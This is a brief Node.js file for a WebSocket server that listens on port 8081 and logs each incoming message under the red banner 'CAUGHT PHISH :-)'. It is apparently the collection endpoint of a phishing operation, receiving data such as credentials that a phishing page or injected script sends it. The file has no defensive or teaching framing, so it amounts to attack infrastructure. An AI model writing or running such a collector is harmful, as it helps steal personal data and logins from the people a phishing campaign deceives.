const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 8081 });

wss.on('connection', function connection(ws) {
  console.log('WebSocket connection established');

  ws.on('message', function incoming(message) {
    const logData = message.toString('utf8'); // Convert binary data to string
    console.log('\x1b[31mCAUGHT PHISH :-)\x1b[0m\n',logData);
  });
});
